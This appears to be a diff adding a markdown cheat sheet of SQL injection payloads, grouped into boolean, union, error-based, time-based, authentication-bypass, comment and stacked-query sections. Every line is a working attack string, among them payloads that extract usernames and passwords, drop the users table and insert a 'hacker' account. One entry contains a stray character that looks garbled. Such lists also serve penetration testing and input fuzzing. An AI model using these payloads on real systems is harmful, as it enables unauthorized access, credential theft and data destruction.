@@ -1,0 +1,53 @@
+# SQL Injection Payloads
+
+## Basic Payloads
+'
+''
+';--
+';夯--
+1' ORDER BY 1--+
+1' ORDER BY 2--+
+1' ORDER BY 3--+
+
+## Boolean-Based
+' OR '1'='1
+' OR '1'='2
+1' AND '1'='1
+1' AND '1'='2
+
+## Union-Based
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+' UNION SELECT username,password FROM users--
+
+## Error-Based
+' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--
+' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT table_name FROM information_schema.tables)))--
+
+## Time-Based
+'; WAITFOR DELAY '0:0:5'--
+'; SLEEP(5)--
+' AND SLEEP(5)--
+
+## Authentication Bypass
+admin'--
+admin' #
+admin'/*
+' or 1=1--
+' or 1=1#
+' or 1=1--
+admin' or '1'='1
+' OR ''='
+
+## Comment-Based
+admin'--
+admin'#
+admin'/*
+'-- 
+'# 
+'/* 
+
+## Stacked Queries
+'; DROP TABLE users;--
+'; INSERT INTO users VALUES('hacker','pass');--
